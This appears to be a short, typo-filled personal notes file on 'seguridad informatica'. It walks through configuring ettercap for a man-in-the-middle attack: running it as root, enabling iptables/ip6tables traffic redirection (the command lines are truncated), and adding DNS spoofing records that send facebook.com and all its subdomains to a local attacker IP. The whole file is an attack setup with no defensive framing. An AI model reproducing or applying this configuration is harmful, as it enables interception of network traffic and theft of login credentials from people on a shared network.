# seguridad
seguridad-informatica
go edti to file confir etter

nano /etc/ettercap/etter.conf

eddit:

ec_uid = 0              
ec_gid = 0

ENABLE ROUTING and IPV& redirect

# if you use iptables:
   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -s %source -d %destination --dport %port -j REDIRECT --to-p>
   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -s %source -d %destination --dport %port -j REDIRECT --to->

# pendant for IPv6 - Note that you need iptables v1.4.16 or newer to use IPv6 redirect
   redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -s %source -d %destination --dport %port -j REDIRECT --to>
   redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -s %source -d %destination --dport %port -j REDIRECT --t>



ADdDD NAME SERVER for redirect to nmy machine
////////////7


facebook.com      A   192.168.0.105
*.facebook.com    A   192.168.9.105
#www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed


//////////////


